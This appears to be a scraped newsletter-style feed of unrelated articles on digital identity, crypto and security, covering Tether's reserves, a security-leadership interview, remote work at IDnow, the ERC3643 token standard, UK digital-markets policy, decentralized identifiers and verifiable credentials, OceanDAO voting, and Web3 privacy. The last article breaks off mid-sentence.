Bankman-Fried Made A Record Fortune In The Crypto&nbsp;Frenzy</a>  Via <a href="http://global.id/antoine">/antoine</a> — <a href="https://calgaryherald.com/news/local-news/city-police-investigate-privacy-breaches-involving-portpass-vaccination-proof-app">City police investigate privacy breaches involving PORTpass vaccination proof&nbsp;app</a>  Via <a href="http://global.id/antoine">/antoine</a> — <a href="https://techcrunch.com/2021/09/21/roblox-to-add-opt-in-age-verification-for-players-and-developers/">Roblox to add opt-in age verification for players and developers — TechCrunch</a>  <a href="https://www.coindesk.com/tech/2021/10/05/web-3-is-where-the-young-people-are/">Web 3 Is Where the Young People&nbsp;Are</a>   2. The problem with&nbsp;Tether <p>If we ever needed an example why regulations might be a good idea, we wouldn’t have to look further than&nbsp;Tether.</p><p>From Bloomberg’s Zeke Faux’s investigative report:</p><blockquote>After I returned to the U.S., I obtained a document showing a detailed account of Tether Holdings’ reserves. It said they include billions of dollars of short-term loans to large Chinese companies — something money-market funds avoid. And that was before one of the country’s largest property developers, China Evergrande Group, started to collapse. I also learned that Tether had lent billions of dollars more to other crypto companies, with Bitcoin as collateral. One of them is Celsius Network Ltd., a giant quasi-bank for cryptocurrency investors, its founder Alex Mashinsky told me. He said he pays an interest rate of 5% to 6% on $1 billion in loans from Tether. Tether has denied holding any Evergrande debt, but Hoegner, Tether’s lawyer, declined to say whether Tether had other Chinese commercial paper. He said the vast majority of its commercial paper has high grades from credit ratings firms, and that its secured loans are low-risk, because borrowers have to put up Bitcoin that’s worth more than what they borrow. “All Tether tokens are fully backed,” he&nbsp;said.</blockquote><p>It’s also worth <a href="https://www.bloomberg.com/opinion/articles/2021-10-07/matt-levine-s-money-stuff-looking-for-tether-s-money">checking out Matt Levine’s&nbsp;take</a>.</p> Relevant:   <a href="https://www.bloomberg.com/opinion/articles/2021-10-07/matt-levine-s-money-stuff-looking-for-tether-s-money">Looking for Tether’s&nbsp;Money</a>  <a href="https://www.reuters.com/technology/stablecoins-face-same-safeguards-traditional-payments-2021-10-06/">Stablecoins to face same safeguards as traditional payments</a>   3.

  <p>by <a href="https://www.kuppingercole.com/team/suess">Fabian Süß</a></p><p>Oliver Carr, cybersecurity evangelist and strategist will discuss the <a href="https://www.kuppingercole.com/sessions/4902/1">Maximizing the Value of Security</a> on Wednesday, November 10 from 12:00 pm to 12:20 pm at <a href="https://www.kuppingercole.com/events/csls2021" title="Cybersecurity Leadership Summit 2021">Cybersecurity Leadership Summit 2021</a>.</p>
<p>To give you a sneak preview of what to expect, we asked Oliver some questions about his presentation.</p>
  
 Could you give us a sneak peek into your keynote: “From Burden to Benefit - How Aligning on Business Purpose and Objectives Is Critical to Maximize the Value of Security”? 
<p>I've spent the last years working very closely in the digital transformation of many large organizations, and a topic that keeps on coming up is that the security function is seen as a necessary evil at best,&nbsp;and a total hindrance at worst. The question is, what does security actually provide to the business? And does the business understand the value that security tools, security processes and security methodologies can bring? What we will look at in this session is how to align what security can bring to the table, but also to understand what the understanding of the other players in the game&nbsp;is, so that the security as a function and the security as a unit within the organizations can move forward and show how they can provide a benefit to the business and therefore move from just being a necessary cost factor to actually providing business benefit. &nbsp;</p>
 How can companies manage the competing demands of minimizing the risk of security breaches and maximizing the opportunities of agile, digital transformations? 
<p>Both security and digital transformation want the same thing at the end of the day. They want to make sure that the business is successful and that it can develop better than the competition. The ways of doing this are different, though, and especially the approach towards risk is different between security, who tend to try to minimize risk and digital transformation, who willingly take risks in order to move ahead of the competition. Bringing those two views together and understanding the necessity of being risk aware. And to decide in a specific case whether it is better to be on the side of caution or whether it is the time to be bold, to move forward is something that only works if there is an open dialog of understanding between those functions. And that is what companies need to achieve going forward if they want to be successful.</p>
 How can aligning on business purposes and objectives help to maximize the value of security? 
<p>Security is very often seen as that cost factor, as that necessary evil. If we want to show the benefit that security can bring, it needs to be brought in terms of what the company actually produces, what the organization produces in the way of products or services. Only by aligning that,&nbsp;can the amount of effort and the amount of money that we need to put into security to achieve that risk appetite that the company is willing to take,&nbsp;really acceptable, not just to the security organization, but to the company overall,&nbsp;and thereby accepting security as part of the solution and not as part of the problem. &nbsp;</p>
 What do you see as the biggest challenge for Security to becoming recognized as a value-adding function? 
<p>Security,&nbsp;in many cases,&nbsp;has been seen as this absolute&nbsp;-&nbsp;what one of my colleagues calls the&nbsp;“Ministry of No”. You're either secure or you are insecure. It is always this question of you're either with us or you are against us. The way we need to move forward,&nbsp;is to accept that between those two extremes, there is a middle ground. It's not an either - or. It's actually an also - and. And if we can move in that area together with the people who within our organizations who are driving that digital transformation, who are driving product innovation and identifying where that common ground is, and to stride down that road together, then we can be successful. And that, to me, is the biggest challenge that we are facing today towards making security a business benefit rather than just a business burden.</p>

<p>At IDnow our employees are family, and to us, this means ensuring they should feel safe, productive, inspired, and energised in their work life. This of course, has become a lot more important during the global corona pandemic since processes became digitalised and engaging in the digital world has become the new normal. At IDnow, we understand the need for a seamless online experience, and so it has become our number one priority to create the best working models for all employees.</p>
<p>Since IDnow introduced the initial remote working policy in early 2020, the benefits have by far outweighed any criticisms: “Some of the IDnow employees were sceptic in the beginning”, told Jacqueline Arlt, Recruitment Business Partner at IDnow. “But after a few months the first colleagues started asking if they can keep working remotely, even after the pandemic. They told us about the benefits they experience and the great work-life balance.” she adds. As working from home became the new normality and employees began seeing the advantages, IDnow introduced a long-term remote policy and offered employees in administrative roles the possibility to choose remote or partially remote working models.</p>
<p>Employees can now decide how and where they are working from, as we believe effective work is not based on the hours they spend at a desk. “We strongly believe that the future of working will be more and more diverse and international and as a global and digital company, offering a flexible way of working without a location-boundary will be the future” says Jacqueline Arlt.</p>
<p>IDnow offers three ways of working for their employees, and everyone who’s role allows it can choose which one suits them best. Employees can decide if and how often they come to the office. Besides from 100% office based, fully and partially home office possibilities, IDnow also offers the possibility to go on a “workcation”. Imagine you travel to see your family in a different country and would like to stay a little longer than your vacation days allow. This is one of the many possibilities with a “workcation”. This way, IDnow offers our employees the best solution to make them feel comfortable, be creative and motivated and have the best possible work-life integration.</p>
<p>You may ask, why is this so important to IDnow? Because we believe that the future is human, and that even the most digital product and company is based on the motivation and happiness of each employee. People are happier and deliver better results in a comfortable and familiar environment. “It’s one of the most important things for us, to make sure every employee at IDnow has the opportunity to maintain a happy and healthy lifestyle, a good work-life-balance and the opportunity to find inspiration in the things they love.” says Jacqueline Arlt.</p>
 Hear what some of our employees have to say about their workcation experience: 
<p>“With the workcation option, I was able to spend 2 months with my family in Italy after the Covid-restrictions got eased.” says Francesca Palmeri, Head of Controlling at IDnow.</p>
<p>“I live in Estonia with my family and work fully remote at IDnow – that offers a great work life balance for me – especially since I’m a dad for a couple of months now. I have a great connection with my team, and we work together very productively.” Pedro Gallardo, Director Product Management.</p>

 T-REX Protocol Recognized as ERC3643 
<p>Last month, the Ethereum community officially recognized the T-REX suite of smart contracts as ERC3643 – the new official standard for permissioned tokens.</p>

		 
	 
                          <p>This content is taken from the monthly Product Focus newsletter in October 2021.</p>   
	 
		 
			<p>Last month, the Ethereum community officially recognised the T-REX suite of smart contracts as&nbsp;<a href="https://tokeny.com/erc3643-an-official-standard-for-permissioned-tokens/?utm_campaign=Product%20Focus&amp;utm_source=hs_email&amp;utm_medium=email&amp;_hsenc=p2ANqtz-_aXnqyJ5mETACN5-6fTfzCHbSvrqN6AFaUfBWXVXCEIpiiW7lElMCcpo50_3sb6ViF-wUu">ERC3643 – the new official standard for permissioned tokens</a>. Here’s a quick rundown of its main functions.</p>
<p>ERC3643 functionality:</p>
<p>Controllable&nbsp;– as the assets are guaranteed by digital identity, the issuer can<a href="https://tokeny.com/tokens-recovery/"> recover tokens</a> as long as the investor can prove who they say they are.</p>
<p>Versatile&nbsp;– ERC3643 tokens can represent a multitude of assets including, but not limited to, securities, cryptocurrencies, stablecoins, fiat currencies, commodities and&nbsp;<a href="https://tokeny.com/how-fractionalization-of-nfts-enables-co-ownership/?utm_campaign=Product%20Focus&amp;utm_source=hs_email&amp;utm_medium=email&amp;_hsenc=p2ANqtz-_aXnqyJ5mETACN5-6fTfzCHbSvrqN6AFaUfBWXVXCEIpiiW7lElMCcpo50_3sb6ViF-wUu">NFTs</a>.</p>
<p>Interoperable&nbsp;– the standard is also compatible with the well known ERC20 standard and is compatible with any Ethereum Virtual Machine (EVM) compatible blockchain, sidechain or Layer 2 solution, such as Polygon.</p>
<p>Secure&nbsp;– the standard has also been audited and confirmed as secure by cybersecurity firm Kaspersky.</p>
<p>&nbsp;</p>
<p>In short, the ERC3643 provides actors with everything they need to issue assets compliantly utilising decentralized technologies. It enables this through the use of permissioned tokens and digital identities, meaning tokens can only be sent or received based on the verified credentials of investors.</p>

<p>Last week we completed our submission to the UK Government’s consultation on its proposed new Digital Markets Unit. It was an interesting exercise.</p> What is competition policy&nbsp;for? <p>Competition policy is the area where the belief system called free market economics gets its purest expression. Under this belief system, there is an invisible, mystical, magical entity called ‘the invisible hand’ of market forces (e.g. innovation and competition) whereby, if left perfectly free from any ‘interference’ from ordinary mortals (such as policy makers and regulators), always, without fail, automatically produces the best of all possible&nbsp;worlds.</p><p>In such a world, the main job of a competition regulator is to intervene if and when there is a ‘market failure’: where for one reason or another, the invisible hand is being stopped from working its magic wonders. Because markets are seen as places where money is exchanged for goods and services, the main test for market failure is the existence of monopolies where, by restricting innovation and competition, monopolists get away with charging excessive prices.</p><p>But because companies like Facebook and Google offer their services for ‘free’ — making their money via the different currency of personal data they haven’t been classed as monopolies. So for decades, they have been left free to do pretty much whatever they&nbsp;liked.</p> Wrestling with&nbsp;reality <p>To its credit, a few years back, the Competition and Markets Authority looked at reality, rather than operating on the assumption that fairy stories are facts. Its <a href="https://www.gov.uk/government/publications/competition-and-markets-authoritys-digital-markets-strategy/the-cmas-digital-markets-strategy-february-2021-refresh">final report</a>, published in early 2021, opened the door to a new approach to regulating ‘digital markets’.</p><p>The report recognised that rather than relying solely on ‘ex post’ interventions (e.g. after a market failure has been proved to exist) regulators should be able to intervene ‘ex ante’ (e.g. before problems occur, with policy goals in mind); and that rather than tackling each isolated abuse separately, one by one, they should be able to “address a wide range of concerns holistically”.</p><p>Specifically, they identified five key issues which need to be addressed:</p>  Network effects and economies of scale — where a platform’s power increases with the number of people using the platform, making it effectively invincible.  Unequal access to user data — “digital platforms collect vast quantities of unique user data, which gives them a significant competitive advantage when providing data-driven services”.  Consumer decision making and the power of defaults — where platforms’ control over default settings effectively gives them control over what choices consumers are presented with; which may be used to “influence the platform’s ability to collect users’&nbsp;data”.  Lack of transparency around complex decision-making algorithms.  The importance of ecosystems — where large collections of integrated, complementary products and services are designed in a way that favours the firm’s own services.   What we&nbsp;said <p>The Government’s consultation was on the scope and powers of the resulting new ‘Digital Markets Unit’. Most of our response was devoted to questioning the Government’s apparent assumption that by definition, all ‘innovation’ and all ‘competition’ is a good thing. It’s just not so. For example, fraudsters constantly innovate in very clever ways to con people out of their money more effectively. Improved competition in the market for the modern slave trade is a bad thing, not a good&nbsp;thing.</p><p>Our particular focus was innovation and competition around the issue of ‘unequal access to user data’. Here, we pointed out, there are two possible types of innovation and competition. The first is innovation and competition around who is most efficient and effective at hoovering up individuals’ personal data and monetising it to line the pockets of their shareholders. The second is innovation and competition around who is most efficient and effective in enabling individuals to access and use their own data for their purposes.</p><p>In other words, the issue is not ‘innovation’ and ‘competition’ in the abstract, but what sort of innovation and competition the Digital Markets Unit chooses to ‘holistically’ address. One of the core suggestions we made therefore is that the DMU should be required to develop a set of criteria — open to public debate and scrutiny — that defines whether any particular innovation is desirable and therefore to be encouraged, or&nbsp;not.</p><p>Unfortunately, the way the UK Government’s questions were framed in this consultation give the impression that the only market it really has in mind is that of more efficient, effective data monetisation and exploitation. Operating on this assumption would take us back to where we were before the CMA wrote its&nbsp;report.</p><p>We did our best to explain why this would be a terrible idea; why empowering individuals with their own data is the only sensible, fair and economically efficient way forward. This issue lies at the heart of everything the Government does in this space, including the shape and content of its new National Data Strategy. It has yet to be resolved. And it’s not going to go&nbsp;away.</p> Joining the&nbsp;dots <p>This is all the more important given the proliferation of other consultations and initiatives currently under way, all of which raise the same core question. These&nbsp;include:</p>  Data: A New Deal consultation to reform data protection regulations  National Data&nbsp;Strategy  Single Login for Government  National Identity and Attributes Trust Framework  Open Finance  Pensions Dashboard programme  Modernisation of Lasting Power of&nbsp;Attorney  NHS consultation on data&nbsp;sharing  Scottish Attribute Provider&nbsp;Service  <p>Is there anyone in Government joining the dots between these different initiatives? If not, is there any chance of the UK ever developing a coherent, positive strategy for personal&nbsp;data?</p> <p><a href="https://medium.com/mydex/the-right-sort-of-competition-e505eaadc662">The Right Sort of Competition</a> was originally published in <a href="https://medium.com/mydex">Mydex</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

<p>Protecting user data from <a href="https://academy.affinidi.com/can-ssi-safeguard-your-information-from-hackers-1b256d3eb6cd">identity fraud</a> has become challenging for businesses in this dynamic environment shaped by privacy and security concerns.</p><p>While centralized and <a href="https://academy.affinidi.com/compare-and-contrast-federated-identity-vs-self-sovereign-identity-227a85cbab18">federated identity</a> management systems may seem like a good idea in terms of user access and convenience, it is also fraught with issues such as security threats, siloed data, poor user control, and&nbsp;more.</p><p>A possible solution to these problems is <a href="https://academy.affinidi.com/self-sovereign-identity-what-you-can-cant-do-with-ssi-1284f7227b4e">Self-Sovereign Identity (SSI)</a>, a revolutionary identity framework that empowers users to determine where their data is stored, how it is used, and with whom it is shared. A popular way to implement SSI is through <a href="https://academy.affinidi.com/what-are-verifiable-credentials-79f1846a7b9">Verifiable Credentials (VCs)</a> and <a href="https://academy.affinidi.com/demystifying-decentralized-identifiers-dids-2dc6fc3148fd">Decentralized Identifiers (DIDs)</a>, two W3C standards that create a common layer for user authentication and verification.</p><p>A DID is a unique identifier built on the Distributed Ledger Technology (DLT) and it is linked to a DID document, that in turn, contains information about an entity. A VC, on the other hand, is a cryptographically verifiable and machine-readable credential of an entity such as the date of birth, government ID, vaccination records, employment details,&nbsp;etc.</p><p>Now comes the big question — how are VCs tied to an entity’s identity in any application?</p> VC Issuance and Verification <p>To understand the relationship between <a href="https://academy.affinidi.com/8-reasons-to-use-verifiable-credentials-300833276b52">VCs</a> and DIDs, let’s talk briefly about the <a href="https://github.com/affinityproject/affinidi-core-sdk">issuance and verification process</a>.</p><p>There are three parties involved in VC issuance and they&nbsp;are:</p>  Issuer — the entity issuing the VC. For example, the Motor Vehicle department issuing a <a href="https://academy.affinidi.com/protecting-your-drivers-license-a-use-case-for-verifiable-credentials-25d22aeac05b">driver&nbsp;license</a>  Holder — the owner of the VC. For example, the individual who owns the&nbsp;license  Verifier — the entity verifying the authenticity of the VC. For example, a police authority who wants to issue a speeding&nbsp;ticket.  <p>Together, these three entities form what’s called a <a href="https://academy.affinidi.com/what-is-the-trust-triangle-9a9caf36b321">trust triangle</a>, and this is a key requirement for implementing SSI. The trust aspect among these entities is handled by <a href="https://academy.affinidi.com/role-of-public-key-cryptography-in-self-sovereign-identity-8c2dc37a2bf3">public-key cryptography,</a> a pair of private and public keys that always work together.</p><p>The process begins when an issuer creates a VC about the holder and digitally signs it with its private key. The holder, on receiving this VC, uses the issuer’s public key to decrypt the information, and store it in his or her <a href="https://academy.affinidi.com/5-reasons-to-use-an-identity-wallet-c289ba2980cf">digital&nbsp;wallet</a>.</p><p>When the holder wants to share this VC with a verifier, he or she creates a verifiable presentation that contains one or more VCs such as date of birth, driver’s license, address, etc, and signs it with his or her private&nbsp;key.</p><p>The verifier decrypts the VC with the holder’s public key to access the information and authenticates that it came from the right source by using the issuer’s public&nbsp;key.</p> Role of Decentralized Identifiers <p>A DID is a unique identifier that is linked to a DID document through a DID&nbsp;method.</p><p>Essentially, the DID method resolves the DID and helps to locate the associated DID document. You can imagine it to be something similar to what a URL would do to locate the web server containing information.</p><p>This DID method is implementation-specific and varies according to the network or distributed ledger where it is implemented. The DID document, on the other hand, contains information about the entities involved in JSON&nbsp;format.</p> Link Between VCs and&nbsp;DIDs <p>To answer the question of how <a href="https://academy.affinidi.com/faqs-on-verifiable-credentials-and-self-sovereign-identity-3c3a505878bc">VCs</a> are linked to identity across applications, we must understand how VCs are linked to&nbsp;DIDs.</p><p>Earlier, we said that the DID document contains information about the entities, and this includes information about their public keys and the cryptographic algorithm used. This information is then used for verifying the identity of the entities.</p><p>Here’s a sample DID document.</p> {   “@context”: [      “https://www.w3.org/ns/did/v1",      “https://w3id.org/security/suites/ed25519-2020/v1"    ]  “id”: “did:example:123456789abcdefghi”,  “authentication”: [{      // used to authenticate as did:…fghi      “id”: “did:example:123456789abcdefghi#keys-1”,      “type”: “Ed25519VerificationKey2020”,      “controller”: “did:example:123456789abcdefghi”,      “publicKeyMultibase”: “zH3C2AVvLMv6gmMNam3uVAjZpfkcJCwDwnZn6z3wXmqPV”   }]  } <p>In other words, DIDs contain information that can verify the authenticity of a&nbsp;VC.</p> Workflow of DIDs and&nbsp;VCs <p>To further elaborate, let’s look at how VCs and DIDs come together from an implementation standpoint.</p> Step 1 — Creating a&nbsp;DID <p>The first step is to create a DID using a specific DID method. The issuer can decide to create a new DID for each VC or use the same DID for all VCs issued to a&nbsp;holder.</p> Step 2 — Adding Information to the DID&nbsp;Document <p>The cryptographic keys of the DID are updated in the DID document.</p><p>Next, the issuer has to collect and/or verify the identity of the holder as required. The exact process of this step would depend on the type of credential. For example, VCs for proving that the holder is more than 21 years requires less stringent verification than issuing a driver’s&nbsp;license.</p><p>The issuer takes this responsibility of verification and accordingly issues a VC to the&nbsp;holder.</p> Step 3 — Signing the&nbsp;VC <p>The VC issued by the issuer contains the DID of both the issuer and the holder and it is digitally signed with the issuer’s DID. After the signing process, the issuer sends the VC to the&nbsp;holder</p> Step 4 — Revoking a&nbsp;VC <p>At a later point, the issuer can choose to revoke the VCs issued, especially if they are no longer related to the holder. While many implementations don’t support <a href="https://academy.affinidi.com/everything-you-need-to-know-about-vc-revocation-846e47ce3e90">VC Revocation</a>, Affinidi’s <a href="https://github.com/affinityproject/affinidi-core-sdk">tech stack</a> has simple methods to revoke&nbsp;VCs.</p> Step 5 — Verifying the&nbsp;VC <p>The holder creates a verifiable presentation consisting of one or more VCs and shares it with a verifier.</p><p>The verifier has to resolve the DID documents from the DID of the issuer and the holder present in the VC. Using the DID method, the verifier can check if the VCs sent by the holder are authentic.</p><p>The verifier also uses the DID methods to check for revocation of the&nbsp;VCs.</p><p>If found authentic, the verifier can offer its services to the&nbsp;holder.</p><p>From the above workflow, it’s clear that VCs are bound with DID, which in turn, reveal the identity of an entity. Since these are interoperable and are not tied to a centralized authority, VCs have many <a href="https://academy.affinidi.com/25-real-world-use-cases-of-verifiable-credentials-4657c9cbc5e">use-cases</a> across different spheres.</p><p>Thus, this is how VCs and identity are linked together across applications.</p><p>For more such content, read through our <a href="http://academy.affinidi.com/">blog posts</a>, join our <a href="https://share.hsforms.com/1FhRGo3c4T-erYRGOSRyzCQ8oa2v">mailing list</a>, and follow us on <a href="https://www.linkedin.com/company/affinidi/">LinkedIn</a>, <a href="https://www.facebook.com/affinidi.devs">Facebook</a>, and&nbsp;<a href="https://twitter.com/affinidi">Twitter</a>.</p><p>The information materials contained in this article are for general information and educational purposes only.

 Towards compound growth in Ocean ecosystem  Punchline <p>OceanDAO is a grants DAO where anyone can propose a project, and each OCEAN holder can vote “yes” or “no” for a&nbsp;project.</p><p>It’s great for the Ocean ecosystem if OCEAN holders thoughtfully vote “yes” and “no” on OceanDAO proposals, to curate towards projects with the best chance of growing the Ocean ecosystem (“thoughtful” voting).</p><p>Voting “no” across all projects with the hope that the burn will drive OCEAN price is simply irrational. It’s too small of a burn to make a dent for the near term, and it hurts the ability to grow value in the longer&nbsp;term.</p><p>If you care about the value of your OCEAN, then please vote, thoughtfully.</p> 1. Introduction <p>This article provides background to better understand the “punchline” presented above. Ocean is designed to mirror Amazon’s successful dynamics. The keys are decentralized funding, curation, and a focus on compound growth (vs dividends).</p><p>The rest of this article is organized as&nbsp;follows.</p>  Sections 2–4 describe Amazon. Sections 2 &amp; 3 describes the Amazon flywheel. Section 4 describes how Amazon focuses revenue on growth rather than shareholder dividends. From this, it’s been able to grow like crazy and create longstanding shareholder value.  Sections 5–8 draw a parallel to Ocean. Sections 5 &amp; 6 describes how Ocean’s token design is modeled after the Amazon flywheel. Section 7 describes how Ocean design focuses on growth to create longstanding value. Section 8 describes how OceanDAO voting plays a big&nbsp;role.   2. The Amazon&nbsp;Flywheel <p>Over 25 years, Amazon has grown from a struggling online bookstore to a globally pervasive company with a trillion dollar market&nbsp;cap.</p><p>Its flywheel was key to success: if Amazon selection grows, then customer experience can’t help but improve; then sales can’t help but grow; then the number of sellers can’t help but grow; then selection can’t help but grow. And the loop continues.</p>The Amazon loop. Source: Amazon.com 3. Amazon Flywheel Components <p>Two key components in this flywheel are (1) its decentralized workers and (2) its resource allocation algorithm.</p>  Amazon has (1) a sea of two-pizza teams, each running fairly independently, each with its own profit &amp; loss. It’s the “workers” block in the image&nbsp;below.  Each team is (2) funded by Amazon HQ according to a resource-allocation algorithm — the “curation” block in the image below. The more ROI a team delivers, the more funding they get. When getting going, they get a bit of time to start — typically months — to start delivering ROI. If they can’t deliver, the project gets shut down and team disbanded.  Amazon’s flywheel, including curation of $ (top left), role of workers (middle), and role of dividends (bottom&nbsp;right) 4. Amazon Growth vs Dividends <p>The revenue for these teams comes as a cut of&nbsp;sales.</p><p>Amazon takes a cut from the sales and aggressively plows it into growth. (“curate” box in the image). It explicitly does not put much into shareholder dividends (“lower-bound-shareholder rewards” in image). This is because money into growth gives benefits that compound over time, whereas dividends are a one-time&nbsp;payoff.</p><p>For example, if Amazon spends R&amp;D money to reduce its logistics costs by 2%, then it can keep reaping those savings for years to come. In contrast, Amazon did a dividend or a stock buyback, it would be a one-time benefit to shareholders and then the money is&nbsp;gone.</p><p>The best way to grow shareholder value is to grow revenue. It would only be rational for Amazon to give dividends if it couldn’t efficiently allocate its capital to growth (ROI &gt; 1). When you see Amazon start to dole out lots of dividends, it means growth has&nbsp;slowed.</p><p>Interestingly, many companies religiously aim to give dividends every year. IBM is famous for it. Unsurprisingly, their growth is tepid, and has been for&nbsp;decades.</p> 5. The Ocean Sustainability Loop <p>Amazon shows how well flywheels can work, including with decentralized workers and an algorithm to allocate resources. This gives Amazon an interesting <a href="https://medium.com/@trentmc0/tokenize-the-enterprise-23d51bafb536">path to decentralization</a>. More usefully to for us: we can use this flywheel as a model for decentralized business models. We call it the <a href="https://blog.oceanprotocol.com/the-web3-sustainability-loop-b2a4097a36e">Web3 Sustainability Loop</a>. We use it as the beating heart of Ocean’s token&nbsp;design.</p><p>If Ocean data selection grows, then data buyer experience can’t help but improve; then data sales can’t help but grow; then the number of data sellers can’t help but grow; then data selection can’t help but grow. And the loop continues.</p> 6. Ocean Sustainability Loop Components <p>Two key components in Ocean’s loop are (1) its decentralized workers and (2) its resource allocation algorithm.</p>  Ocean has (1) a sea of OceanDAO-funded teams, each running fairly independently, each with its own profit &amp; loss. It’s the “workers” block in the image&nbsp;below.  Each team is (2) funded by OceanDAO according to its resource-allocation algorithm: voting. This is the “curation” block in the image below. The more ROI a team delivers, the more funding they can expect over time. When getting going, they get a bit of time to start — to start delivering ROI. If they can’t deliver, the team should not expect to receive further&nbsp;grants.  Ocean Sustainability Loop is an instance of Web3 Sustainability Loop&nbsp;pattern<p>Ocean is an ecosystem. There are way more teams than just OPF core team working to build and grow the Ocean ecosystem. Here are examples of work funded by OceanDAO.</p>  Ocean documentation. These have matured greatly in the last half year, thanks to Akshay. Work includes: search, ocean.py API, Provider API, Aquarius API, and (currently) documentation for&nbsp;V4.  Deep Gaia-X engagement. OPF core team has been engaged with Gaia-X a long time. However this engagement has become broader and stronger thanks to work by grant recipients (deltaDAO).  Vote with datatoken pools. This was accomplished by a grant (Tim Daubenshuetz).  Moderation of TG, Discord, and other channels. This is done by the Ocean Ambassadors grants recipients.  Learn about Ocean. The Ocean Academy team created tons of awesome material to onboard people about Ocean. It’s become so good, that doing Ocean Academy is a pre-requisite for people to become Ocean Ambassadors.  Learn about OceanDAO grants. The Ocean Pearl team has created a gorgeous frontend (oceanpearl.io) to browse, search and filter OceanDAO grants recipients. The scope is increasing to support other OceanDAO flows such as&nbsp;voting.   7. Ocean Growth vs&nbsp;Burning <p>The revenue for OceanDAO teams comes from OPF treasury, 51% rewards, and (with traction) Network&nbsp;Revenue.</p><p>Ocean is designed to aggressively plows Network Revenue into growth. (“curate” box in the image). It explicitly puts just 5% — a low amount — into burning (bottom left image). This is because money into growth gives benefits that compound over time, whereas burning is a one-time&nbsp;payoff.</p><p>For example, if OceanDAO grants R&amp;D money to a new app that adds 100,000 participants to Ocean ecosystem, those people will stick around for years to come, assuming they’re getting value from the app. Network Revenue would flow to the Ocean community accordingly.</p><p>In contrast, in a burn situation, it a one-time benefit to OCEAN holders and then the money is&nbsp;gone.</p><p>Burning actually happens in two places: (a) 5% of Network Rewards, as described, and (b) any OceanDAO funds not allocated in a given funding cycle, i.e. not enough projects with a sufficient “yes” vote to use up the funds available.</p><p>The best way to grow OCEAN value is to grow Network Revenue. It would only be rational for OceanDAO to burn its funds it couldn’t efficiently allocate its capital to growth (ROI &gt;&nbsp;1).</p><p>We’ve actually built TokenSPICE simulations that validate this (at least with the model assumptions). In scenario A, we ran at 95% of Network Revenue to OceanDAO, and 5% to burning. In scenario B, the opposite. The results: in 10 years, predicted market cap was about 10x higher for scenario A. Focus on growth creates the most value for OCEAN holders, because it compounds. Burning is a one-time&nbsp;payoff.</p> 8. OceanDAO Voting &amp; Ocean&nbsp;Growth <p>Let’s drill in on voting in OceanDAO.</p><p>What’s rational: voting “yes” for projects that you think have a good chance to help grow Ocean (expect ROI &gt; 1 over&nbsp;time).</p><p>What’s rational: voting “no” for projects that you think don’t have a good chance (ROI &lt;1 and will never get&nbsp;better)</p><p>What’s less rational: voting “no” on all projects because you think burning will help drive the price of Ocean. This less rational because the amount burned is so low that it won’t dent the price of OCEAN. Even more importantly, it means the ecosystem isn’t getting funded — precisely where the growth needs to&nbsp;be!</p><p>Put another way, ask yourself: can I expect more returns to OCEAN from this project in the next 6–18 months, versus burning? If yes, then vote yes. If no, then no. Burning is the lower-bound measuring stick for assessing value&nbsp;add.</p> 9. Conclusion <p>This article reviewed the Amazon flywheel and how Ocean’s token dynamics mirror them. It highlighted that value creation comes from funding for growth, which gives compound rewards over time. Contrast this to burning which is only a one-time payoff (and is money taken from&nbsp;growth).</p> <p><a href="https://blog.oceanprotocol.com/on-voting-in-oceandao-8f7e07d40e9d">On Voting In OceanDAO</a> was originally published in <a href="https://blog.oceanprotocol.com">Ocean Protocol</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

 By <a href="https://beincrypto.com/author/gloria-wu/">Gloria Wu&nbsp;, Chief of Ecosystem Partnerships at&nbsp;Ontology</a> <p>The internet is currently in a liminal phase. It is sitting on the precipice of changes that will shake up human life in ways that we could have only imagined ten years ago. Web3 is the internet’s third iteration. It is seeing the digital sphere become more open-source.</p><p>A transparent community of developers is building this new web. It means it is trustless — participants can interact without intermediaries harvesting their data. Finally, it means it is permissionless — that anyone can participate without the need for a governing body.</p><p>Under the correct guiding principles, Web 3.0 can offer an internet that is more decentralized, open, and secure. To make this a reality, individuals as opposed to corporations and privacy as opposed to profits must have sovereignty in Web&nbsp;3.0.</p> Looking back to move&nbsp;forward <p>Web 2.0 was defined by innovations such as smartphone technology, social media, and cloud computing. In tandem with these developments, data processing and collection quickly grew legs. It became a source for capital gains and marketing success with little regulation in place on data harvesting and its&nbsp;uses.</p><p>Policymakers have begun to police this through laws such as <a href="https://gdpr-info.eu/">GDPR</a> and <a href="https://www.esma.europa.eu/policy-rules/mifid-ii-and-mifir">MiFID ii</a> in Europe. In addition to updated <a href="https://www.cnbc.com/2021/06/22/tech-industry-urges-congress-to-slow-down-new-antitrust-bills.html">antitrust laws</a> aimed at increasing consumer protection in the United&nbsp;States.</p><p>Ultimately, however, the underlying problem is that data is a valuable commodity. However, data protection is not something that chimes with the interests of big corporations.</p> The privacy&nbsp;failure <p>As well as facilitating an internet economy that thrives through data harvesting, Web 2.0 has failed to protect consumers’ privacy. This is because most data is stored on centralized platforms such as computer files and databases.</p><p>This makes data extremely vulnerable to losses, alterations, and hacks. Last year saw more than <a href="https://www.infosecurity-magazine.com/blogs/top-5-data-breaches-in-history/">37 billion</a> records exposed due to just under 4000 data breaches in the&nbsp;U.S.</p><p>It’s not just <a href="https://www.nytimes.com/2021/09/02/business/facebook-whatsapp-privacy-fine.html">Big Tech</a> giants, like Watsapp and Amazon, that are in hot water when it comes to <a href="https://beincrypto.com/learn/top10-must-have-cryptocurrency-security-tips/">security</a>. National health services such as the Health Service Executive (<a href="https://www.bbc.com/news/world-europe-58413448">HSE</a>) in Ireland, as well as <a href="https://www.bbc.com/news/uk-england-kent-57404917">schools</a> and <a href="https://www.bbc.com/news/business-57447404">restaurants</a> around the world, have all been implicated in significant data breaches this year. Therefore, showing how centralized systems can no longer provide users with the data protection they&nbsp;need.</p><p>Centralized bodies are often required to exchange data with different companies to function. For instance, when a bank must seek information from a loan provider on a customer’s repayment history.</p><p>Moving this data creates a new copy. With that copy, an opportunity arises for loss or incorrect data to be replicated or&nbsp;altered.</p><p>Web3 is perfectly placed to remedy the existing failures of these centralized systems. In addition, it can place privacy at the forefront of all technological developments.</p><p>Using a decentralized data storage system can ensure that each entity involved in data exchange has access to a real-time, shared view of the data when permission is granted by the person in control. Therefore, reducing the risk of malpractice.</p> Web3 and decentralized identities <p>Another essential part of the decentralization of Web3 will be the creation of secure digital identities.</p><p>The current model of online identity verification on the web is old and fraught with vulnerabilities. To do almost anything interactive, we have to supply valuable personal information. This comes with little oversight into how it is shared and protected.</p><p>Decentralized identity solutions already exist in 